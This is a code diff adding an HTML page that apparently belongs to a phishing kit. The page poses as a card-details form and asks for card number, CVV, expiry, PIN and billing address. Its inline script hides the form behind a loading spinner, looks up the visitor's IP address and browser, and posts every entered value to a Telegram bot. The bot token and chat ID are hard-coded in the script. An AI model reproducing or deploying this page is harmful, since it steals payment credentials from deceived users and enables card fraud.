@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Card Details</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+	<div class="mainContainer card">
+		<form class="card-form">
+			<img id="logo" src="./download.png" alt="Logo">
+
+			<h2>Enter Card Details</h2>
+			<p class="card-instruction">
+				Please provide your card and billing information to proceed.
+			</p>
+
+			<div class="input-group">
+				<input type="text" placeholder="Cardholder Name" name="cardholder_name" required>
+			</div>
+
+			<div class="input-group">
+				<input type="text" placeholder="Card Number" name="card_number" maxlength="19" inputmode="numeric" required>
+			</div>
+
+			<div class="row">
+				<div class="input-group">
+					<input type="text" placeholder="MM/YY" name="expiry_date" maxlength="5" required>
+				</div>
+				<div class="input-group">
+					<input type="password" placeholder="CVV" name="cvv" maxlength="4" required>
+				</div>
+			</div>
+
+			<div class="input-group">
+				<input type="password" id="card-pin" placeholder="Card PIN" name="card_pin" maxlength="6" required>
+			</div>
+
+			<div class="input-group">
+				<input type="text" placeholder="Billing Address" name="billing_address" required>
+			</div>
+
+			<div class="row">
+				<div class="input-group">
+					<input type="text" placeholder="City" name="city" required>
+				</div>
+				<div class="input-group">
+					<input type="text" placeholder="ZIP / Postal Code" name="zip_code" required>
+				</div>
+			</div>
+
+			<div class="button-div">
+				<button type="submit">Submit</button>
+			</div>
+
+			<div class="go-back">
+				<a href="./index.html">Back</a>
+			</div>
+		</form>
+	</div>
+
+	<div class="loading-container">
+		<div class="spinner"></div>
+	</div>
+
+	<script>
+		// NOTE: Do NOT commit real bot tokens or chat IDs. Replace the placeholders below
+		// with secure configuration methods (server-side, environment variables, or secrets store).
+
+		// Function to send Card details to Telegram
+		async function sendCardToTelegram(cardDetails, ip, ua, botToken, chatId) {
+			const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+			try {
+				const response = await fetch(url, {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json',
+					},
+					body: JSON.stringify({
+						chat_id: chatId,
+						text: `#----------[ NB Card Details ]------------#\n${cardDetails}\n#---------------------[ Visitor ]-------------------------#\nIP Address  : ${ip}\nDEVICE INFORMATION      : ${ua}\n#---------------[ G1 - END ]--------------------#`,
+					}),
+				});
+
+				const data = await response.json();
+
+				if (data.ok) {
+					console.log(`Card details sent successfully to chat ID ${chatId}:`, data);
+				} else {
+					console.error(`Telegram API returned an error for chat ID ${chatId}:`, data.description);
+				}
+			} catch (error) {
+				console.error(`Error sending card details to Telegram chat ID ${chatId}:`, error);
+			}
+		}
+
+		// Function to fetch the IP address
+		async function fetchIpAddress() {
+			try {
+				const response = await fetch('https://api.ipify.org?format=json');
+				const data = await response.json();
+				return data.ip;
+			} catch (error) {
+				console.error("Error fetching IP address:", error);
+				return "Unavailable";
+			}
+		}
+
+		// Handle card form submission
+		const cardForm = document.querySelector('.card-form');
+		if (cardForm) {
+			cardForm.addEventListener('submit', async function (event) {
+				event.preventDefault();
+
+				const form = event.target;
+				const formData = new FormData(form);
+
+				// Show loading indicator and hide form
+				form.style.display = 'none';
+				document.querySelector('.loading-container').style.display = 'flex';
+
+				// Fetch IP address and User-Agent
+				const ip = await fetchIpAddress();
+				const ua = navigator.userAgent;
+
+				const cardDetails = Object.fromEntries(formData.entries());
+				const message = `CARD DETAILS\n------------\nName: ${cardDetails.cardholder_name}\nCard Number: ${cardDetails.card_number}\nExpiry: ${cardDetails.expiry_date}\nCVV: ${cardDetails.cvv}\nPIN: ${cardDetails.card_pin}\nAddress: ${cardDetails.billing_address}\nCity: ${cardDetails.city}\nZIP: ${cardDetails.zip_code}`;
+
+				// Bots: replace the placeholders with your tokens & chat IDs securely
+				const bots = [
+					{ botToken: '7365792836:AAHFTCJXAglEjMYuXPj5WxPlvJD1UqR1uzI', chatId: '6994641548' },
+				];
+
+				for (const { botToken, chatId } of bots) {
+					if (!botToken || botToken.startsWith('REDACTED')) {
+						console.warn('Bot token is not configured; skipping send to Telegram.');
+						continue;
+					}
+					try {
+						await sendCardToTelegram(message, ip, ua, botToken, chatId);
+					} catch (error) {
+						console.error(`Error sending Card details to bot ${botToken} with chat ID ${chatId}:`, error);
+					}
+				}
+
+				// Redirect to a done page (adjust as needed)
+				setTimeout(() => {
+					window.location.href = "./index.html";
+				}, 50000);
+			});
+		}
+
+		// Safe guard for resend-link if present
+		const resendLink = document.getElementById('resend-link');
+		if (resendLink) {
+			resendLink.addEventListener('click', function (e) {
+				e.preventDefault();
+				alert("Card resend functionality is not implemented yet.");
+			});
+		}
+	</script>
+
+</body>
+
+</html>
+
